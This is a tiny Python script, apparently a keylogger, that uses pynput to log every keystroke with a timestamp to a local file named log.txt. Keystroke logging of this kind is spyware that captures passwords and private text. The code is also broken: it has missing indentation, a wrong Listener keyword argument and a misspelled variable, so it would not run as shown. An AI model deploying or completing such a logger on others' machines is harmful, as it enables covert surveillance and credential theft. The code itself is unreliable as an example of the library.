from pynput.keyboard import Key, Listener
import logging
directory=""
logging.basicConfig(filename=(directory+"log.txt"),level=logging.DEBUG, format='%(asctime)s:%(message)s:')

def onPress(key):
logging.info(str(key))

with Listener(onPress=onPress) as listner:
listerner.join()